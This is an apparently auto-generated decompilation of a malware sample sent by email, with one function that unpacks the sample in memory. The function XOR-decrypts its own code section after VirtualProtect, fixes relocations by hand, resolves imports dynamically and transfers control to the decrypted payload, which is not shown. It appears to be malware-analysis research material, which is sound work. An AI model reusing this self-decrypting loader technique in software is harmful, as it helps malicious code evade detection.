// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0464/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(Eq_9 eax, word32 edx, up32 esi)
{
	SHLWAPI.dll!StrStrIA();
	Eq_3 * edi_12 = null;
	up32 dwLoc14_15 = 0x000000E8;
	Eq_3 * ebx_106 = (Eq_3 *) 0x00000020;
	if (eax != 0x00000000)
		goto l004011BF;
	else if (AddUsersToEncryptedFile(eax, eax) == 0x00000000)
		return;
	else
	{
		word32 eax_101 = AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF);
		if (eax_101 == 0x00000000)
			ebx_106 = eax_101 + 0x0000002E;
		fp->dwFFFFFFEC = fp - 0x00000018;
		fp->dwFFFFFFEC = 0x00000040;
		VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF);
		Eq_50 * ecx_120 = null;
		do
		{
			if (edi_12 == ebx_106)
				edi_12 = null;
			ecx_120->b4015D8 = edi_12->b404000 ^ ecx_120->b4015D8 ^ 0xA0;
			ecx_120 = ecx_120 + 1;
			edi_12 = edi_12 + 1;
		} while (ecx_120 <u (Eq_50 *) 0x00001440);
		fp->dwFFFFFFEC = 0x00000000;
		Eq_78 * edx_150 = &globals->t4028D8;
		up32 ebp_155 = 0x00000000;
		if (esi >u 0x00000000)
			do
			{
				Eq_95 eax_295 = edx_150->dw0004 - 0x00000008 >>u 0x00000001;
				Eq_103 * ecx_298 = &edx_150->t0008;
				if (eax_295 > 0x00000000)
				{
					Eq_95 ebx_311 = eax_295;
					do
					{
						word32 eax_314 = (word32) ecx_298->w0000;
						if ((eax_314 & 0x0000F000) == 0x00003000)
						{
							Eq_124 * eax_326 = (eax_314 & 0x00000FFF) + edx_150->dw0000;
							eax_326->dw401358 = eax_326->dw401358 + 0xF0401358;
						}
						ecx_298 = ecx_298 + 1;
						ebx_311 = ebx_311 - 0x00000001;
					} while (ebx_311 != 0x00000000);
					ebp_155 = dwLoc14_15;
				}
				ebp_155 = ebp_155 + edx_150->dw0004;
				dwLoc14_15 = ebp_155;
				edx_150 = edx_150 + Mem160[edx_150 + 0x00000004:word32];
			} while (ebp_155 <u esi);
		if (globals->dw4020D4 != 0x00000000)
		{
			Eq_89 * ebx_189 = &globals->t4020C4;
			do
			{
				Eq_189 eax_203 = LoadLibraryA(ebx_189->dw000C + 0x00401358);
				Eq_189 ecx_205 = eax_203;
				if (eax_203 != 0x00000000)
				{
					Eq_151 * ebp_228 = ebx_189->ptr0000;
					if (ebp_228 == null)
						ebp_228 = ebx_189->ptr0010;
					Eq_160 eax_234 = ebp_228->u401358;
					Eq_164 * ebp_235 = &ebp_228->u401358;
					word32 esi_236 = Mem160[ebx_189 + 0x00000010:word32] + 0x00401358;
					if (eax_234 != 0x00000000)
						while (true)
						{
							word32 eax_255;
							if (eax_234 < 0x00000000)
								eax_255 = GetProcAddress(ecx_205, (word32) ebp_235->t0000);
							else
								eax_255 = GetProcAddress(ecx_205, eax_234.u0);
							esi_236->dw0000 = eax_255;
							ebp_235 = ebp_235 + 1;
							eax_234 = ebp_235->t0000;
							esi_236 = esi_236 + 1;
							if (eax_234 == 0x00000000)
							{
								ebx_189 = dwLoc14_174;
								goto l004011A2;
							}
							ecx_205 = eax_203;
						}
				}
l004011A2:
				ebx_189 = ebx_189 + 1;
				dwLoc14_174 = ebx_189;
			} while (ebx_189->ptr0010 != null);
		}
		0x00401DB8();
		ExitProcess(0x00000000);
l004011BF:
		return;
	}
}

